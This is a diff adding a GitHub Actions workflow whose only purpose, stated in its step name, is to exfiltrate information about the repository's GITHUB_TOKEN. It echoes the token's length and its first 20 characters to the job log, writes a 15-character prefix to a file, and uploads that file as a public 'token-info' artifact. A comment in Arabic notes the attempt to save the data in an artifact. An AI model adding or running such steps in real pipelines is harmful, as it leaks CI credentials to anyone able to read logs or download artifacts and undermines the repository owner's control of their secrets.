@@ -1,0 +1,23 @@
+name: Artifact Test
+on: workflow_dispatch
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try to exfiltrate token info
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Token length: ${#TOKEN}"
+          echo "Token prefix: ${TOKEN:0:20}"
+          
+          # جرب تحفظ معلومات في artifact
+          mkdir output
+          echo "Token starts with: ${TOKEN:0:15}" > output/info.txt
+          
+      - name: Upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: token-info
+          path: output/
